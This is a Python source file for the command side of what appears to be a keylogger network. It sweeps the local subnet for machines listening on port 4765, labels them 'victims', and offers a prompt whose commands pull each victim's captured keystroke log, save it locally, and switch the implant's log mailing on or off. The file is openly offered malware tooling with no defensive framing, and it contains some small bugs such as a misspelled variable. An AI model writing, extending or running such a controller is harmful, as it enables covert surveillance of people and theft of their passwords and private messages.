import socket
import subprocess
from get_local_addr import get_local_addr
import os


def main():

    PORT = 4765

    victims = scan_lan(PORT)
    parse_cmd(victims, PORT)


def scan_lan(PORT):
    local_addr = get_local_addr()
    subnet = '.'.join(local_addr.split('.')[:-1])
    victims = []
    for i in range(1, 255):
        addr = subnet + '.' + str(i)
        try:
            os.system('clear')
            print("[*] Checking address: " + addr)
            temp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            temp.settimeout(0.12)
            temp.connect((addr, PORT))
            victims.append(addr)
            temp.close()
        except:
            temp.close()
            continue
    os.system('clear')

    if len(victims) > 0:
        print("[+] Available victims:")
        print("-----------------------------")
        i = 0
        for addr in victims:
            print('[' + str(i) + '] ' + addr)
            i += 1
        print("-----------------------------")
    else:
        print("[-] No available victims found")
        print("[!] Try running 'rescan' later")

    return victims


def parse_cmd(victims, PORT):
    cmd = input("OYE> ")
    if len(cmd.split(' ')) > 1:
        if 0 < len(cmd.split(' ')[0]) < 5:
            target = victims[int(cmd.split(' ')[0])]
        elif 0 > len(cmd.split(' ')[0]):
            terget = cmd.split(' ')[0]
        else:
            print("[-] Invalid target")
            parse_cmd(victims, PORT)
    else:
        target = '0.0.0.0'

    if len(cmd.split(' ')) > 1:
        intent = ' '.join(cmd.split(' ')[1:])
    else:
        intent = cmd

    if intent == 'getlog':
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[*] Connecting to", target+':'+str(PORT))
        s.connect((target, PORT))
        print(s.recv(26).decode('utf-8'))
        s.send(intent.encode())
        f = open('/sdcard/oyesklog_' + target + '.txt', 'w')
        l = s.recv(1024)
        while l:
            f.write(l.decode('utf-8'))
            l = s.recv(1024)
        f.close()
        s.close()
        print("[+] Log received")
        parse_cmd(victims, PORT)
    elif intent == 'mailoff':
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[*] Connecting to", target+':'+str(PORT))
        s.connect((target, PORT))
        print(s.recv(26).decode('utf-8'))
        s.send(intent.encode())
        s.close()
        parse_cmd(victims, PORT)
    elif intent == 'mailon':
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[*] Connecting to", target+':'+str(PORT))
        s.connect((target, PORT))
        print(s.recv(26).decode('utf-8'))
        s.send(intent.encode())
        s.close()
        parse_cmd(victims, PORT)
    elif intent == 'rescan':
        main()
    elif intent == 'help':
        print("[!] Available commands: getlog, mailoff, mailon, rescan, help, exit, quit")
        parse_cmd(victims, PORT)
    elif intent == 'exit' or intent == 'quit':
        print("[*] Exiting...")
        exit()
    else:
        print("[-] Unknown command")
        print("[!] Available commands: getlog, mailoff, mailon, rescan, help, exit, quit")
        parse_cmd(victims, PORT)


if __name__ == "__main__":
    main()
